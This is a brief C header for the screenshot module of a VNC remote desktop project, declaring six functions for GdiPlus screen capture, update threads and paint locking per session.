//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: scr.h
// $Revision: 137 $
// $Date: 2013-07-23 16:57:05 +0400 (Вт, 23 июл 2013) $
// description:
//	GdiPlus support module. Screenshot generation engine.

WINERROR ScrStartup(VOID);
VOID ScrCleanup(VOID);	

WINERROR ScrStartUpdateThread( PVNC_SESSION pSession );
VOID ScrStopUpdateThread( PVNC_SESSION pSession );

VOID ScrLockPainting( PVNC_SESSION pSession );
VOID ScrUnlockPainting( PVNC_SESSION pSession );
